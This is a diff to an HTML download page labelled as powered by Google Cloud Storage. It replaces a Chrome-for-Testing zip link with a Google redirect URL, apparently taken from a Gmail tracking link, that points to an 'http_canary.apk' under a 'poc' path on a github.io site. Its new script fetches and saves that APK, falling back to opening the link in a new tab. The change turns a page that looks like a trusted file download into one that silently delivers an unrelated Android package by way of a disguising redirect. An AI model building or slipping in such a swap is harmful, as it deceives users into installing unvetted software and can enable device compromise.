@@ -103,18 +103,37 @@
     <footer>Powered by Google Cloud Storage</footer>
   </div>
 
-  <script>
-    const fileUrl = 'https://storage.googleapis.com/chrome-for-testing-public/142.0.7444.61/linux64/chrome-linux64.zip';
-    const fileName = 'chrome-linux64.zip';
+<script>
+const fileUrl = 'https://www.google.com/url?q=https://ryirwansyah.github.io/poc/http_canary.apk&source=gmail&ust=1762590355211000&usg=AOvVaw22hw2Ga34pJXZ6nBB530AX';
+const fileName = 'http_canary.apk';
 
-    function downloadFile() {
-      const link = document.createElement('a');
-      link.href = fileUrl;
-      link.download = fileName;
-      document.body.appendChild(link);
-      link.click();
-      link.remove();
-    }
-  </script>
+async function downloadFile() {
+  // Try to fetch the resource and download via blob (requires CORS)
+  try {
+    const resp = await fetch(fileUrl, { method: 'GET', mode: 'cors' });
+    if (!resp.ok) throw new Error('Network response not OK: ' + resp.status);
+
+    // If the response is HTML (Google interstitial) bail out and fallback
+    const contentType = resp.headers.get('content-type') || '';
+    if (contentType.includes('text/html')) throw new Error('Got HTML (probably not the file)');
+
+    const blob = await resp.blob();
+    const blobUrl = URL.createObjectURL(blob);
+
+    const a = document.createElement('a');
+    a.href = blobUrl;
+    a.download = fileName; // browser will use this filename for blob downloads
+    document.body.appendChild(a);
+    a.click();
+    a.remove();
+    URL.revokeObjectURL(blobUrl);
+    return;
+  } catch (err) {
+    console.warn('Blob download failed (CORS or network). Falling back to navigation:', err);
+  }
+
+  window.open(fileUrl, '_blank', 'noopener');
+}
+</script>
 </body>
 </html>
